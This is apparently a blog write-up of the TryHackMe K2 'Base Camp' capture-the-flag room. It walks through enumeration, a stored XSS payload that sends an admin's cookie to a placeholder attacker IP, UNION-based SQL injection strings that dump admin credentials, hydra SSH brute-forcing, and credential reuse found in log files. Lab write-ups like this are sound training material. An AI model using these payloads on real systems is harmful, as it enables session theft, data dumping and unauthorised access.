# Tryhackme K2 — The Base Camp

K2 is a hard level room on tryhackme which has 3 sections — base camp, middle camp and the summit.

---

### Tryhackme K2 — The Base Camp

![](https://cdn-images-1.medium.com/max/800/1*kfALpRV6kFnamEXXfsE__Q.png)

K2 is a hard level room on tryhackme which has 3 sections — base camp, middle camp and the summit.

In this writeup , i will be doing the base camp section.

starting with enumeration, i ran a basic nmap scan to see all open ports.

found port 80 (http) and port 22 (ssh) open

![](https://cdn-images-1.medium.com/max/800/1*NMMFkUopg6gd1hiRAabj-A.png)

also added k2.thm to my hosts file.

opening the website there was nothing much, considering we have been given the domain k2.thm already, i decided to run subdomain enumeration scripts using ffuf.

found it.k2.thm and admin.k2.thm

![](https://cdn-images-1.medium.com/max/800/1*QtREXXtsAAL9bCCmSjQPtA.png)![](https://cdn-images-1.medium.com/max/800/1*wN7gC_M9bcjynQGPPW71tQ.png)

creating an account on the it.k2.thm leads us to here

![](https://cdn-images-1.medium.com/max/800/1*053UQSvONQXz6JukbcuSAQ.png)

due to my ctf experience and instincts, i directly decided to test for xss and session stealing to get the cookie from the admin.

**<iframe onload=”new Image().src=’http://your\_ip:your\_port?x='+document['coo'+'kie']">**

entered this in both the title and description and after waiting some time , i got the cookie

![](https://cdn-images-1.medium.com/max/800/1*blIlko88KCSacaUCOdwr4g.png)

after getting the cookie i went to admin.k2.thm and added the cookie to my session.

![](https://cdn-images-1.medium.com/max/800/1*yfQ2jYCJo-o2hJZgHtjr3w.png)

reloading the page and going to /dashboard took me here

![](https://cdn-images-1.medium.com/max/800/1*kIuCOiLr0SMwO0XnpPCJNA.png)

after tinkering around a bit , i eventually started testing the title field for sql injection and confirmed it by entering ‘ into the field and getting an error (sqli possible)

‘UNION SELECT 1,2,3 — —

using this i was able to confirm that there are 3 columns in the table.

now finding the database name

‘UNION SELECT 1,2,database() — -

after finding the db name i checked the table names

‘UNION SELECT 1,2,group\_concat(table\_name) FROM information\_schema.tables WHERE table\_schema = database() — -

found tables admin\_auth, auth\_tables and tickets.’

decided to dump the table admin\_auth by first finding out the columns.

‘UNION SELECT 1,2,group\_concat(column\_name) FROM information\_schema.columns WHERE table\_name = admin\_auth — -

found out columns admin\_passoword and admin\_username and dumped them.

‘UNION SELECT admin\_password,NULL,admin\_username FROM admin\_auth — -

![](https://cdn-images-1.medium.com/max/800/1*FsSSmqtEOAyOJHTtcbC9ww.png)

after getting the passwords i created a wordlist and used it against ssh with hydra

![](https://cdn-images-1.medium.com/max/800/1*bbJyTonRG4Xjwle2M5dupg.png)

logging in as james , gave us the user.txt flag

using id we can see that we are part of adm group, which means we can read log files on the system

![](https://cdn-images-1.medium.com/max/800/1*eh0XVyzUTY_85rCF1n31Jw.png)

reading nginx logs i found the user and password of rose

![](https://cdn-images-1.medium.com/max/800/1*3Ld5u3EAFvoQqWkMPwPYpw.png)

tried using that combination to use the account rose but it didnt work

![](https://cdn-images-1.medium.com/max/800/1*gfjy0P3qGqW2KK8VC2G_eA.png)

next i tried using the same password for the root account

![](https://cdn-images-1.medium.com/max/800/1*DbHnRemp1GzhN_rdz7kZvw.png)

got the root flag too,

we have 3 users

james

root

rose

put these and theirpasswords in ques 3.

for the last question, read the /etc/passwd file to see the full names.

Thank you for reading!

By [Lightningfst](https://medium.com/@lightningfst8) on [June 16, 2026](https://medium.com/p/c1de225da9af).

[Canonical link](https://medium.com/@lightningfst8/tryhackme-k2-the-base-camp-c1de225da9af)

Exported from [Medium](https://medium.com) on August 8, 2026.
